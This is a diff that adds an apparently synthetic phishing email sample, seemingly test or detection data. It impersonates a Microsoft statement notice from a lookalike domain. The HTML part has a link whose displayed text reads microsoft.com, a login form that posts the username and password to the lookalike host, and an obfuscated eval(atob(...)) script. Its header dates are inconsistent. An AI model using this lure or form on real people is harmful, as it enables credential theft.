@@ -1,0 +1,35 @@
+From: notice@microsoft-sso.workers.dev
+To: victim52@example.com
+Subject: Monthly statement available [ref U453D70]
+Date: Tue, 22 Mar 2002 06:11:00 -0500
+Message-ID: <phish-112-8f7c7dd9-0972-4f16-96c3-5e51b6ae99ac@microsoft-sso.workers.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 15 Mar 2002 12:39:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 05 Mar 2002 18:30:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 18 Mar 2002 13:46:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 20 Mar 2002 09:25:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 10 Mar 2002 05:57:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 11 Mar 2002 10:54:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 14 Mar 2002 20:09:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 25 Mar 2002 11:56:00 -0500
+Return-Path: <notice@microsoft-sso.workers.dev>
+Reply-To: notice@microsoft-sso.workers.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=microsoft-sso.workers.dev; dkim=pass header.d=microsoft-sso.workers.dev; dmarc=pass header.from=microsoft-sso.workers.dev
+Received-SPF: pass (mx.example.com: domain of notice@microsoft-sso.workers.dev designates 192.0.2.52 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=microsoft-sso.workers.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-112-ecbc3f86"
+
+--bnd-p-112-ecbc3f86
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://microsoft-sso.workers.dev/statement/U453D70
+
+Reference: U453D70
+--bnd-p-112-ecbc3f86
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://microsoft-sso.workers.dev/statement/U453D70<br/><br/>Reference: U453D70</p><p><a href="http://microsoft-sso.workers.dev/login">https://www.microsoft.com/signin</a></p><form action="http://microsoft-sso.workers.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-112-ecbc3f86--
